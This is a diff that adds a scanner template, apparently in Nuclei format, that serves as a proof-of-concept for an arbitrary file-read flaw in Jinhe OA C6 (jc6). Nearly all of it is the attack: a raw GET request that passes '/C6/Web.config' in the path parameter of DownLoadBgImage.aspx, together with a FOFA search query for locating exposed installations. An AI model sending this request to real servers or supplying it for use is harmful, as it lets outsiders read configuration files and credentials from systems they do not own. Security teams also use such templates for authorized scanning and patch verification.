@@ -1,0 +1,21 @@
+id: poc-vd1c0sepv5hmmtco
+info:
+  name: 金和OA jc6 DownLoadBgImage接口存在文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vd1c0sepv5hmmtco'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vd1c0sepv5hmmtco
+    fofa: body="/jc6/platform/"
+http:
+- raw:
+  - 'GET /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/Web.config HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
